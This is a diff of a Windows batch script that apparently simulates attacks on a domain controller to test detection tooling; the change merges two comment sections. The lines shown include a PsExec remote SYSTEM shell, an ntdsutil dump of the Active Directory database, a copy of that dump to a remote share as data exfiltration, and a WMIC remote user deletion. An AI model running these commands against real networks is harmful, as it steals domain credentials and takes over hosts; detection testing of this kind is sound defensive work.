@@ -106,13 +106,8 @@ TIMEOUT /T 3
 exit
 TIMEOUT /T 120
 
-rem **Remote code execution attempts 
-PSExec.exe -accepteula \\%mydc% cmd.exe
-TIMEOUT /T 3
-exit
-TIMEOUT /T 120
-
-rem **Data exfiltration over SMB (PUT name of a directory on your local machine to copy files to)
+rem **Remote code execution attempts and Data exfiltration over SMB 
+rem **(PUT THE NAME OF A LOCAL DIRECTORY TO COPY FILES TO)
 psexec.exe -accepteula -s \\%mydc%  cmd.exe
 ntdsutil.exe "Activate Instance NTDS" "IFM" "Create Full c:\windows\mdi" "q" "q"
 copy "c:\windows\mdi\Active Directory" \\aftest2\test
@@ -121,7 +116,7 @@ exit
 TIMEOUT /T 120
 
 
-rem ** Cleanup ** (PUT YOUR DOMAIN CONTROLLER HERE)
+rem ** Cleanup
 wmic /node:"%mydc%" process call create "net user /delete BadGuy"
 del *.zip
 del *.txt
